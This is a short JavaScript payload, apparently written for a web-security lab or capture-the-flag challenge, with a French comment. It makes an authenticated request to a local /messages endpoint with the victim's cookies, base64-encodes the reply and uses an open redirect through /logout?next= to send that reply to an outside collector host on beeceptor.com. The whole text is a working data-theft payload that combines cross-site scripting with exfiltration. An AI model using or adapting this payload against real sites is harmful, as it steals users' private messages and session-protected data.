fetch("http://127.0.0.1:5002/messages", {
  method: "GET",
  credentials: "include"
})
  .then(r => r.text())
  .then(txt => {
    console.log(txt); // la réponse complète en string
    document.location = '/logout?next=https://skavens.free.beeceptor.com/' + btoa(txt)
  })
  .catch(console.error);
